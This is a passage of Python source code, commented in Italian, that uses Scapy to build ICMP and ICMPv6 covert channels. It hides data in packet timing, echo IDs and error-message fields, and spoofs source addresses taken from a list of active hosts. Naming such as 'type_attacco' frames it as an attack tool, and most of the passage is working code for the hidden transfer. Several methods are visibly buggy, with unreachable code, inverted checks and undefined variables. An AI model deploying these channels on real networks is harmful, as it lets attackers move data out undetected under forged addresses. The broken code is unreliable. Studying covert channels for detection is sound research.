        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        if not ip_src: 
            raise ValueError("ip_src non valido") 
        pkt= Ether(dst=self.target_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP(type=ICMP_TYPE.v4_Echo_Reply.value, id=125, seq=225)/\
            Raw() 
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  
        for byte_data in data: 
            mask=(1<<self.numero_bit)-1  
            icmp_type=random.choice([
                ICMP_TYPE.v4_Echo_Reply,
                #ICMP_TYPE.v4_TimeExceeded
            ])
            #print("PIECE DATA:",format(byte_data, "08b")) 
            #print("MASK:",mask) 
            for index in range(0,8,self.numero_bit): 
                #print("INDEX:",index) 
                #print("4bit: ",(byte_data >> index) & mask) 
                #print("---------------") 
                index_time=(byte_data >> index) & mask 
                time.sleep(self.TEMPI_CODICI[index_time])  
                pkt= Ether(dst=self.target_mac)/\
                    IP(src=ip_src, dst=self.ip_dst.compressed)/\
                    ICMP(type=icmp_type.value, id=125, seq=225)/\
                    Raw()
                #pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface)  
            time.sleep(self.TEMPO_BYTE)
    
    def send_last(self): 
        pass  

    def ipv4_timing_cc(self):  
        #TO DELETE IF NORMAL wait (_IPx) WORKS
        try:  
            THREADING_EVENT.wait(self.event_pktconn) 
            str_data=""
            for integer in self.timing_data:
                str_data+=format(integer, f'0{self.numero_bit}b') 
            raw_data="" 
            for index in range(0, len(str_data), 8):
                int_data=0
                for bit in str_data[index:index+8][::-1]:
                    int_data=int_data<<1|int(bit)
                raw_data+=chr(int_data) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}") 
        if True:  
            joined="".join(raw_data)
            cleaned="".join(x for x in joined if x in string.printable)
            self.data=cleaned  
            return True 
        return False

class IPV4_TIMING_8BIT(_IPx): 
    timeout_callback=None
    timer=None 
    min_delay=None 
    max_delay=None 
    stop_value=None 
    start_time=end_time=previous_time=None

    def __init__(self, ip_dst:ipaddress.IPv4Address=None, host_attivi:ipaddress.IPv4Address=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255): 
        if not IS_TYPE.integer(min_delay) or min_delay<=0: 
            raise TypeError("test_timing_channel8bit: Argomenti non validi") 
        if  not IS_TYPE.integer(max_delay) or max_delay<=min_delay: 
            raise TypeError("test_timing_channel8bit: Argomenti non validi") 
        if not IS_TYPE.integer(stop_value) or not (0<=stop_value <=255):
            raise TypeError("test_timing_channel8bit: Argomenti non validi") 
        super().__init__(ip_dst, host_attivi)
        self.timeout_callback=self.timeout_timer_callback() 
        self.min_delay=min_delay 
        self.max_delay=max_delay 
        self.stop_value=stop_value  
    
    def get_callback(self): 
        def decode_byte(delay): 
            #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
            frazione = (delay - self.min_delay) / (self.max_delay - self.min_delay) 
            byte=int(round(frazione*255)) 
            return byte 
        def callback(pkt): 
            nonlocal self 
            if pkt.haslayer(ICMP) and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
                #current_time=datetime.datetime.now() 
                #current_time=time.perf_counter() 
                current_time=pkt.time 
                if self.previous_time is not None: 
                    delta=(current_time-self.previous_time) 
                byte=decode_byte(delta) 
                print(f"Delta:{delta}\tByte:{byte} Char:{chr(byte)}") 
                self.data.append(chr(byte)) 
                if byte==self.stop_value: 
                    self.stop_flag["value"]=True 
                    self.end_time=pkt.time 
                else: self.start_time=pkt.time 
                self.previous_time=current_time 
        return callback 
    
    def wait(self, type_list:list[int]=None): 
        if not IS_TYPE.list(type_list) or len(type_list)<=0:
            type_list=[x.value for x in ICMP_TYPE if x.name.startswith("v4_")] 
        else: type_list=[x for x in type_list if IS_TYPE.integer(x)] 
        super().wait(type_list)  
    
    def send(self, data:bytes=None, type_attacco:Enum=None):
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise TypeError("ip_dst non valido") 
        if not IS_TYPE.integer(self.min_delay) or self.min_delay<=0: 
            raise TypeError("data non integer") 
        if not IS_TYPE.integer(self.max_delay) or self.max_delay<=self.min_delay: 
            raise TypeError("data non integer") 
        if not IS_TYPE.integer(self.stop_value) or not (0<=self.stop_value <=255): 
            raise TypeError("data non integer") 
        target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
        if not target_mac: 
            raise ValueError("target_mac non valido")
        interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
        if not interface: 
            raise ValueError("interface non valida")
        pkt = Ether(dst=target_mac)/\
            IP(dst=self.ip_dst.compressed, proto=1)/\
            ICMP()/\
            Raw() 
        sendp(pkt, verbose=1, iface=interface) 
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        for byte in data:   
            delay=self.min_delay+(byte/255)*(self.max_delay-self.min_delay)
            print(f"Delay :{byte}\t{delay}\n")
            #print(f"Data: {byte}\t{byte-31}\t{type(byte)}\n") 
            time.sleep(delay) 
            pkt = Ether(dst=target_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed)/\
                ICMP()/\
                data 
            #pkt.summary() 
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface) 

    def send_last(self): 
        stop_delay=self.min_delay+(self.stop_value/255)*(self.max_delay-self.min_delay)
        #print(f"[STOP] Inviando byte di stop {self.stop_value} dopo {stop_delay}") 
        time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
        pkt = Ether(dst=self.target_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP()/\
            Raw() 
        #pkt.summary() 
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface) 
    
class IPV4_TIMING_8BIT_NOISE(_IPx):  
    timeout_callback=None
    timer=None 
    min_delay=None 
    max_delay=None 
    stop_value=None 
    rumore=None 
    seed=None 
    start_time=end_time=None 
    current_time=previous_time=None 

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255, rumore:int=2, seed:int=4582):
        if not IS_TYPE.integer(self.min_delay): 
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        if  not IS_TYPE.integer(self.max_delay): 
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        if not IS_TYPE.integer(self.stop_value):
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        if not IS_TYPE.integer(self.rumore) :
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        if self.min_delay<=0: 
            raise Exception("Valori negativi o nulli non sono accettati")
        if self.max_delay<=self.min_delay: 
            raise Exception("Il vlaore masismo non può essere minore di quello minimo") 
        if not (0<=self.stop_value <=255): 
            raise Exception("Valore stop value non corretto") 
        if not IS_TYPE.integer(self.seed):
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        self.timeout_callback=self.timeout_timer_callback() 
        self.min_delay=min_delay 
        self.max_delay=max_delay 
        self.stop_value=stop_value 
        self.rumore=rumore
        min_delay+=self.rumore
        max_delay+=self.rumore
        self.seed=seed 
        random.seed(self.seed) 

    def get_callback(self): 
        def decode_byte(delay): 
            nonlocal self
            #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
            frazione = (delay - self.min_delay) / (self.max_delay - self.min_delay) 
            byte=int(round(frazione*255)) 
            byte = max(0, min(255, byte))
            return byte 
        def callback(pkt): 
            nonlocal self 
            if pkt.haslayer(ICMP) and pkt.haslayer(Raw): #and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
                #self.current_time=datetime.datetime.now() 
                #self.current_time=time.perf_counter() 
                self.current_time=pkt.time 
                if self.previous_time is None:
                    self.start_time= self.previous_time = self.current_time 
                return 
                random_delay = int.from_bytes(pkt[Raw].load, byteorder='big', signed=True)
                #random_delay = random.randint(-rumore, rumore)
                delay=(self.current_time-self.previous_time)-random_delay
                print("This Delay:", delay,"Random delay:", random_delay, "Send Delay" ,delay-random_delay)
                byte=decode_byte(delay) 
                print(f"Delta:{delay}\tByte:{byte} Char:{chr(byte)}") 
                received_data.append(chr(byte))

                self.previous_time=self.current_time
                
                if byte==stop_value: 
                    stop_flag["value"]=True 
                self.end_time=pkt.time 
        return callback
    
    def wait(self, type_list:list[int]=None): 
        if not IS_TYPE.list(type_list) or len(type_list)<=0:
            type_list=[x.value for x in ICMP_TYPE if x.name.startswith("v4_")] 
        else: type_list=[x for x in type_list if IS_TYPE.integer(x)] 
        super().wait(type_list) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        #Il rumore serve per non mandare sempre con lo stesso intervallo di tempo. 
        #tuttavia andrà aggiunto al minimo e al massimo per evitare errori nel calcolo del delay
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise TypeError("ip_dst non valido") 
        if not IS_TYPE.integer(self.min_delay) or self.min_delay<=0: 
            raise TypeError("data non integer") 
        if not IS_TYPE.integer(self.max_delay) or self.max_delay<=self.min_delay: 
            raise TypeError("data non integer") 
        if not IS_TYPE.integer(self.stop_value) or not (0<=self.stop_value <=255): 
            raise TypeError("data non integer") 
        if IS_TYPE.integer(self.rumore): 
            raise TypeError("rumore non integer") 
        if IS_TYPE.integer(self.seed):
            raise TypeError("seed non integer") 
        target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
        if not target_mac: 
            raise ValueError("target_mac non valido")
        interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
        if not interface: 
            raise ValueError("interface non valida") 
        min_delay+=self.rumore
        max_delay+=self.rumore
        #Nel caso non si voglia mettere il rumore scelto nel payload chi ricevere deve avere lo stesso seed 
        random.seed(self.seed) 
        random_delay=random.randint(-self.rumore, self.rumore)
        pkt = Ether(dst=self.target_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP()/\
            Raw(load=(0).to_bytes(signed=True)) 
        sendp(pkt, verbose=1, iface=self.interface) 
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        for byte in data:   
            delay=min_delay+(byte/255)*(max_delay-min_delay)
            #print(f"Delay:{chr(byte)} {byte}\t{delay}") 
            random_delay=random.randint(-self.rumore, self.rumore)  
            #print("Delay:", delay,"Random delay:", random_delay, delay+random_delay)
            delay=delay+random_delay
            time.sleep(delay) 
            pkt = Ether(dst=self.target_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed)/\
                ICMP() /\
                Raw(load=random_delay.to_bytes(signed=True)) 
            #print(f"Sending {pkt.summary()}") 
            sendp(pkt, verbose=1, iface=self.interface) 

    def send_last(self): 
        stop_delay=self.min_delay+(self.stop_value/255)*(self.max_delay-self.min_delay)
        random_delay=random.randint(-self.rumore, self.rumore) 
        #print(f"[STOP] Inviando byte di stop {self.stop_value} dopo {self.stop_delay}") 
        stop_delay=stop_delay+random_delay
        #print(f"[STOP] Inviando byte di stop {self.stop_value} dopo {self.stop_delay}") 
        time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
        pkt = Ether(dst=self.target_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP()/\
            Raw(load=random_delay.to_bytes(signed=True))  
        #print(f"Sending {pkt.summary()}") 
        sendp(pkt, verbose=1, iface=self.interface) 

class IPV6_ECHO(_IPx):  
    ECHO_REQ=ICMP_TYPE.v6_Echo_Request
    ECHO_REP=ICMP_TYPE.v6_Echo_Reply
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if not (icmp_layer:=( packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply))):
                return  
            icmp_id=icmp_layer.getfieldval("id") 
            if icmp_id==self.stop_integer and icmp_layer.getfieldval("seq")==self.stop_integer: 
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return 
            byte1 = (icmp_id >> 8) & 0xFF 
            byte2 = icmp_id & 0xFF 
            self.data.extend([chr(byte1),chr(byte2)]) 
        return callback 
    
    def wait(self): 
        super().wait([self.ECHO_REQ, self.ECHO_REP])  
    
    def send(self, data:bytes=None): 
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("target_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8) 
            else: 
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= (
                Ether(dst=self.dst_mac, src=src_mac)
                /IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src)
                /ICMPv6EchoReply(type=self.ECHO_REP,id=icmp_id)
            ) 
            sendp(pkt, verbose=1,iface=self.interface) 
    
    def send_last(self): 
        ip_src=NETWORK.IP.find_local_IP() 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        pkt= (
            Ether(dst=self.dst_mac, src=src_mac)
            /IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                  src=ip_src.compressed)
            /ICMPv6EchoReply(type=self.ECHO_REP,
                             id=self.stop_integer, seq=self.stop_integer)
            / Raw(load="Hello Neighbour".encode())
        )
        #print(f"Sending {pkt.summary()}") 
        sendp(pkt, verbose=1,iface=self.interface)  

class IPV6_PARAMETER_PROBLEM(_IPx): 
    PARAMETER_PROBLEM=ICMP_TYPE.v6_ParameterProblem
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self  
            if not (icmp_layer:=packet.getlayer(ICMPv6ParamProblem)): 
                return
            ptr=icmp_layer.getfieldval("ptr") 
            if ptr==0xffffffff: #TO DO aggiungere controlo id e seq in IPerror
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return 
            self.data.append(ptr.to_bytes(4,"big"))#.decode())
            if (ipErr_layer:=packet.getlayer(IPerror6)): 
                self.data.append(ipErr_layer.getfieldval("plen").to_bytes(2,"big"))#.decode())  
                if (echo_layer:=packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply)): 
                    self.data.append(echo_layer.getfieldval("id").to_bytes(2,"big"))#.decode()) 
        return callback
    
    def wait(self):      
        super().wait([self.PARAMETER_PROBLEM]) 
    
    def send(self, data:bytes=None):  
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("target_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        ip_src=NETWORK.IP.find_local_IP() 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 8):  
            dummy_pkt=(
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed, 
                    plen=int.from_bytes(data[index+4:index+6]))  /
                ICMPv6EchoRequest(
                    type=ICMP_TYPE.v6_Echo_Reply,
                    id=int.from_bytes(data[index+6:index+8]), 
                    seq=0
                )
            )
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed)  /
                ICMPv6ParamProblem(
                    ptr=int.from_bytes(data[index:index+4]),
                    type=self.PARAMETER_PROBLEM) /
                dummy_pkt
            ) 
            sendp(pkt, verbose=1,iface=self.interface)  
        
    def send_last(self): 
        ip_src=NETWORK.IP.find_local_IP() 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPerror6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed)/
            ICMPv6EchoRequest(
                type=ICMP_TYPE.v6_Echo_Reply, 
                id=self.stop_integer, seq=self.stop_integer)
        ) #,src=ip_src.compressed
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed)  /
            ICMPv6ParamProblem(
                type=self.PARAMETER_PROBLEM,ptr=0xFFFFFFFF) /
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface)  

class IPV6_TIME_EXCEEDED(_IPx): 
    TIME_EXCEEDED=ICMP_TYPE.v6_TimeExceeded
    
    def get_callback(self):
        def callback(packet): 
            nonlocal self 
            if not packet.haslayer(ICMPv6TimeExceeded): 
                return
            if not (ipErr_layer:=packet.getlayer(IPerror6)):
                return 
            ptr=ipErr_layer.getfieldval("plen")
            if ptr==0xffff: 
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return 
            self.data.append(ptr.to_bytes(2,"big").decode()) 
            if icmp_layer:=(packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply)): 
                id=icmp_layer.getfieldval("id")
                if id==self.stop_integer and icmp_layer.getfieldval("seq")==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                self.data.append(id.to_bytes(2,"big"))#.decode()) 
        return callback  
    
    def wait(self, type_list:list[int]=None):      
        super().wait([self.TIME_EXCEEDED]) 
    
    def send(self, data:bytes=None): 
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("target_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 4): 
            dummy_pkt=(
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}", 
                    src=ip_src.compressed,
                    plen=int.from_bytes(data[index:index+2]))  /
                ICMPv6EchoReply(
                    type=ICMP_TYPE.v6_Echo_Reply.value,
                    id=int.from_bytes(data[index+2:index+4]), seq=0) 
            ) 
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed)  /
                ICMPv6TimeExceeded(type=self.TIME_EXCEEDED) /
                dummy_pkt
            )  
            sendp(pkt, verbose=1,iface=self.interface) 
    
    def send_last(self): 
        ip_src=NETWORK.IP.find_local_IP() 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed,
                 plen=0xffff)  /
            ICMPv6EchoReply(
                type=ICMP_TYPE.v6_Echo_Reply.value,
                id=self.stop_integer, seq=self.stop_integer)
        ) 
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed) /
            ICMPv6TimeExceeded(type=self.TIME_EXCEEDED) /
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface) 

class IPV6_PACKET_BIG(_IPx): 
    PACKET_BIG=ICMP_TYPE.v6_PacketTooBig
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if not packet.haslayer(ICMPv6PacketTooBig): 
                return 
            mtu=packet.getlayer(ICMPv6PacketTooBig).getfieldval("mtu") 
            self.data.append(mtu.to_bytes(4,"big"))#.decode()) 
            if ipErr_layer:=packet.getlayer(IPerror6): 
                plen=ipErr_layer.getfieldval("plen") 
                if plen==0xffff: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return
                self.data.append(plen.to_bytes(2,"big"))#.decode()) 
                icmp_layer=(packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply)) 
                id=icmp_layer.getfieldval("id")
                if id==self.stop_integer and icmp_layer.getfieldval("seq")==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return
                self.data.append(id.to_bytes(2,"big"))#.decode()) 
        return callback 
    
    def wait(self, type_list:list[int]=None):      
        super().wait([self.PACKET_BIG]) 
    
    def send(self, data:bytes=None): 
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("target_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)) if self.host_attivi else None 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 8): 
            dummy_pkt=(
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}", 
                    src=ip_src.compressed, 
                    plen=int.from_bytes(data[index+4:index+6]))/
                ICMPv6EchoReply(
                    type=ICMP_TYPE.v6_Echo_Reply.value,
                    id=int.from_bytes(data[index+6:index+8]), 
                    seq=0)
            )
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed)  /
                ICMPv6PacketTooBig(
                    type=self.PACKET_BIG, 
                    mtu=int.from_bytes(data[index:index+4])) /
                dummy_pkt
            )  
            sendp(pkt, verbose=1,iface=self.interface) 
    
    def send_last(self): 
        ip_src=NETWORK.IP.find_local_IP() 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed, 
                plen=0xffff)  /
            ICMPv6EchoReply(
                type=ICMP_TYPE.v6_Echo_Reply.value,
                id=self.stop_integer, seq=self.stop_integer)
        )
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac)/
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed)/
            ICMPv6PacketTooBig(type=self.PACKET_BIG, mtu=0)/
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface) 

class IPV6_DESTINTION_UNREACHABLE(_IPx): 
    DESTINATION_UNREACHABLE=3  
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if not (icmp_layer:=packet.getlayer(ICMPv6DestUnreach)): 
                return 
            if not (ipErr_layer:=packet.getlayer(IPerror6)): 
                return 
            plen=ipErr_layer.getfieldval("plen")
            if plen==0xffff: 
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return
            self.data.append(plen.to_bytes(2,"big"))#.decode()) 
            icmp_layer=(packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply))
            if icmp_layer: 
                id=icmp_layer.getfieldval("id") 
                if id==0 and icmp_layer.getfieldval("seq")==1: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                self.data.append(id.to_bytes(2,"big"))#.decode())  
        return callback 
    
    def wait(self, type_list:list[int]=None):      
        super().wait([self.TYPE_DESTINATION_UNREACHABLE])  
    
    def send(self, data:bytes=None):  
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("target_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)) if self.host_attivi else None 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido")  
        for index in range(0, len(data), 4): 
            dummy_pkt=(
                IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                     src=ip_src.compressed, 
                     plen=int.from_bytes(data[index:index+2]))  /
                ICMPv6EchoReply(type=128,id=int.from_bytes(data[index+2:index+4]), seq=0)
            )
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                     src=ip_src.compressed)  /
                ICMPv6DestUnreach(type=self.DESTINATION_UNREACHABLE) /
                dummy_pkt
            ) 
            sendp(pkt, verbose=1,iface=self.interface)  
        
    def send_last(self): 
        ip_src=NETWORK.IP.find_local_IP() 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed, 
                plen=0xffff)  /
            ICMPv6EchoReply(
                type=ICMP_TYPE.v6_Echo_Reply.value,
                id=self.stop_integer, seq=self.stop_integer)
        )
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed)  /
            ICMPv6DestUnreach(type=self.DESTINATION_UNREACHABLE) /
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface)  

class IPV6_TIMING(_IPx): 
    timeout_callback=None
    timer=None 
    numero_bit=0 
    ECHO_REQ=ICMP_TYPE.v6_Echo_Request.value
    ECHO_REP=ICMP_TYPE.v6_Echo_Reply.value 
    last_packet_time=None 

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, numero_bit:int=0):
        if not IS_TYPE.integer(numero_bit): 
            raise Exception("Numero di bit non valido")
        super().__init__(ip_dst, host_attivi)
        self.timeout_callback=lambda: self.timeout_timer_callback()
        self.timer=GET.timer(None,self.timeout_callback)  
        self.DISTANZA_TEMPI=2 #sec
        self.TEMPI_CODICI=[
            3+index*2*self.DISTANZA_TEMPI for index in range(2**self.numero_bit)
        ] 
        self.TEMPO_BYTE=0*60 #minuti 
    
    def get_callback(self): 
        if self.numero_bit<=0: 
            return None   
        DISTANZA_TEMPI=2 #sec
        dict_tempi={}
        dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**self.numero_bit)])
        dict_bit={ }
        dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**self.numero_bit) ])  

        MINUTE_TIME=0*60+30 #minuti
        MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
    
        def callback(packet): 
            nonlocal MAX_TIME, MINUTE_TIME  
            if self.last_packet_time is None: 
                self.last_packet_time=packet.time 
                self.timer.cancel()
                self.timer=GET.timer(MAX_TIME,self.timeout_callback) 
                self.timer.start() 
                return  
            if packet.time is not None: 
                delta_time=packet.time-self.last_packet_time   
                arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                min_value=min([y for _,y in arr]) 
                min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                self.data.append(dict_bit.get(arr[min_indices[0]][0]))
                self.last_packet_time=packet.time
                self.timer.cancel() 
                if len(self.data)%8==0: 
                    self.timer=GET.timer(MINUTE_TIME,self.timeout_callback) 
                else:
                    self.timer=GET.timer(MAX_TIME,self.timeout_callback) 
                self.timer.start()
        return callback
    
